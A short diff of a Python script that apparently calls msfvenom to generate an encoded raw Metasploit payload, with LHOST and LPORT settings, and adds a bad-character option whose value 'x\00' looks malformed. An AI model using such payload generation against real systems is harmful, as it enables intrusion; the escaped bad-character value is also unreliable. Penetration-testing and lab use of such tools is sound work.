@@ -23,6 +23,7 @@ def main():
 		'LPORT=' + lport,
 		'LHOST=' + lhost,
 		'-e', encoder,
+		'-b', 'x\\00',
 		'-f', 'raw',
 		'-o', './msf.bin'],
 		capture_output=False)
